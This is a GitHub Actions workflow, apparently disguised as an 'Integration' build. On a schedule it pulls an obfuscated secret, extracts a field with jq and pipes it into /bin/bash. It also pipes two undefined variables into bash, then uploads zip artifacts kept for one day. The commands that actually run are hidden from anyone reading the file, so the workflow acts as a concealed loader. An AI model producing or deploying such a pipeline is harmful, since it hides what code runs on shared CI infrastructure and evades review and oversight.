name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '22 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  operation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        env:
          o55: ${{ secrets.o55 }}
        run: |
          printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
          printf '%s' "$iwfk7" | jq -r .aium608 | /bin/bash
          echo $rst58438 | jq -r .ghhgk59 | /bin/bash

      - name: Archive output
        uses: actions/upload-artifact@v4
        with:
          name: Jp3UP7JK
          path: "*.zip"
          retention-days: 1
